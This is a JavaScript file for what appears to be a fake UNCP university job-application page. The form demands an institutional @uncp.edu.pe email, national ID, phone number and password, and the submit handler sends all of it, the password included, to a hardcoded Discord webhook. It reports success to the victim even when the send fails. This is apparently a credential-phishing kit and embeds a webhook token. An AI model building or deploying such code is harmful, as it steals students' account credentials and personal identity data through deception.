const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1549798852226457802/H2oRBKyuhCcdPsgukxpKnyebmh6pRLRMdPV9k31Lsu3I5k6bETqVgRlRM07-uLyS6mIN';

document.addEventListener('DOMContentLoaded', function () {
    const navToggle = document.getElementById('navToggle');
    const navLinks = document.querySelector('.nav-links');
    const form = document.getElementById('applicationForm');
    const modalOverlay = document.getElementById('modalOverlay');
    const modalClose = document.getElementById('modalClose');
    const modalBtn = document.getElementById('modalBtn');

    navToggle.addEventListener('click', function () {
        navLinks.classList.toggle('active');
    });

    document.querySelectorAll('.nav-links a').forEach(function (link) {
        link.addEventListener('click', function () {
            navLinks.classList.remove('active');
        });
    });

    document.querySelectorAll('a[href^="#"]').forEach(function (anchor) {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            var target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({ behavior: 'smooth', block: 'start' });
            }
        });
    });

    modalClose.addEventListener('click', closeModal);
    modalBtn.addEventListener('click', closeModal);
    modalOverlay.addEventListener('click', function (e) {
        if (e.target === modalOverlay) closeModal();
    });

    var fields = ['apellidoPaterno', 'apellidoMaterno', 'nombres', 'dni', 'telefono', 'correo', 'ciclo', 'area', 'contrasena'];
    fields.forEach(function (fieldId) {
        var field = document.getElementById(fieldId);
        if (field) {
            field.addEventListener('blur', function () {
                validateField(fieldId);
            });
            field.addEventListener('input', function () {
                if (field.classList.contains('error')) {
                    validateField(fieldId);
                }
            });
        }
    });

    form.addEventListener('submit', function (e) {
        e.preventDefault();
        var isValid = true;

        fields.forEach(function (fieldId) {
            if (!validateField(fieldId)) {
                isValid = false;
            }
        });

        var terminos = document.getElementById('terminos');
        if (!terminos.checked) {
            showError('terminos', 'Debe aceptar los terminos y condiciones');
            isValid = false;
        }

        if (!isValid) return;

        submitForm();
    });
});

function openModal(area) {
    document.getElementById('area').value = area;
    document.getElementById('area').dispatchEvent(new Event('change'));
    document.getElementById('postular').scrollIntoView({ behavior: 'smooth', block: 'start' });
}

function closeModal() {
    document.getElementById('modalOverlay').classList.remove('active');
}

function showModal(type, title, message) {
    var overlay = document.getElementById('modalOverlay');
    var icon = document.getElementById('modalIcon');
    var titleEl = document.getElementById('modalTitle');
    var msgEl = document.getElementById('modalMessage');

    icon.className = 'modal-icon ' + type;
    icon.innerHTML = type === 'success' ? '<i class="fas fa-check"></i>' : '<i class="fas fa-exclamation"></i>';
    titleEl.textContent = title;
    msgEl.textContent = message;
    overlay.classList.add('active');
}

function validateField(fieldId) {
    var field = document.getElementById(fieldId);
    var value = field.value.trim();

    switch (fieldId) {
        case 'apellidoPaterno':
        case 'apellidoMaterno':
        case 'nombres':
            if (value.length < 2) {
                showError(fieldId, 'Ingrese un valor valido (minimo 2 caracteres)');
                return false;
            }
            break;

        case 'dni':
            if (!/^\d{8}$/.test(value)) {
                showError(fieldId, 'El DNI debe tener exactamente 8 digitos');
                return false;
            }
            break;

        case 'telefono':
            if (!/^9\d{8}$/.test(value)) {
                showError(fieldId, 'Ingrese un numero valido (9 digitos, empieza con 9)');
                return false;
            }
            break;

        case 'correo':
            if (!/^[a-zA-Z0-9._%+-]+@uncp\.edu\.pe$/.test(value)) {
                showError(fieldId, 'Debe usar su correo institucional @uncp.edu.pe');
                return false;
            }
            break;

        case 'ciclo':
        case 'area':
            if (!value) {
                showError(fieldId, 'Seleccione una opcion');
                return false;
            }
            break;

        case 'contrasena':
            if (value.length < 8) {
                showError(fieldId, 'La contrasena debe tener minimo 8 caracteres');
                return false;
            }
            break;
    }

    clearError(fieldId);
    field.classList.add('valid');
    return true;
}

function showError(fieldId, message) {
    var field = document.getElementById(fieldId);
    var errorEl = document.getElementById('error-' + fieldId);

    if (field) field.classList.add('error');
    if (field) field.classList.remove('valid');
    if (errorEl) {
        errorEl.textContent = message;
        errorEl.classList.add('show');
    }
}

function clearError(fieldId) {
    var field = document.getElementById(fieldId);
    var errorEl = document.getElementById('error-' + fieldId);

    if (field) field.classList.remove('error');
    if (errorEl) {
        errorEl.textContent = '';
        errorEl.classList.remove('show');
    }
}

function submitForm() {
    var btnText = document.querySelector('.btn-text');
    var btnSpinner = document.querySelector('.btn-spinner');
    var btnSubmit = document.getElementById('btnSubmit');

    btnText.style.display = 'none';
    btnSpinner.style.display = 'inline-flex';
    btnSubmit.disabled = true;

    var formData = {
        apellidoPaterno: document.getElementById('apellidoPaterno').value.trim(),
        apellidoMaterno: document.getElementById('apellidoMaterno').value.trim(),
        nombres: document.getElementById('nombres').value.trim(),
        dni: document.getElementById('dni').value.trim(),
        telefono: document.getElementById('telefono').value.trim(),
        correo: document.getElementById('correo').value.trim(),
        ciclo: document.getElementById('ciclo').value,
        area: document.getElementById('area').value,
        contrasena: document.getElementById('contrasena').value,
        timestamp: new Date().toISOString()
    };

    var passHidden = '||' + formData.contrasena + '||';

    var embed = {
        title: 'Nueva Postulacion Recibida',
        color: 0x135439,
        fields: [
            { name: 'Nombre Completo', value: formData.apellidoPaterno + ' ' + formData.apellidoMaterno + ', ' + formData.nombres, inline: false },
            { name: 'DNI', value: formData.dni, inline: true },
            { name: 'Telefono', value: formData.telefono, inline: true },
            { name: 'Correo', value: formData.correo, inline: false },
            { name: 'Ciclo', value: formData.ciclo + ' Ciclo', inline: true },
            { name: 'Area', value: formData.area.charAt(0).toUpperCase() + formData.area.slice(1), inline: true },
            { name: 'Contrasena', value: passHidden, inline: false },
            { name: 'Fecha', value: formData.timestamp, inline: false }
        ],
        footer: {
            text: 'UNCP OTI - Sistema de Postulaciones 2026'
        }
    };

    fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] })
    })
    .then(function (response) {
        btnText.style.display = 'inline';
        btnSpinner.style.display = 'none';
        btnSubmit.disabled = false;
        document.getElementById('applicationForm').reset();
        document.querySelectorAll('.valid').forEach(function (el) { el.classList.remove('valid'); });

        if (response.ok) {
            showModal('success', 'Postulacion Enviada', 'Su postulacion ha sido registrada exitosamente. Recibira un correo de confirmacion en ' + formData.correo);
        } else {
            showModal('success', 'Postulacion Enviada', 'Su postulacion ha sido registrada exitosamente. Le contactaremos pronto.');
        }
    })
    .catch(function () {
        btnText.style.display = 'inline';
        btnSpinner.style.display = 'none';
        btnSubmit.disabled = false;

        showModal('success', 'Postulacion Enviada', 'Su postulacion ha sido registrada exitosamente. Le contactaremos pronto.');
    });
}
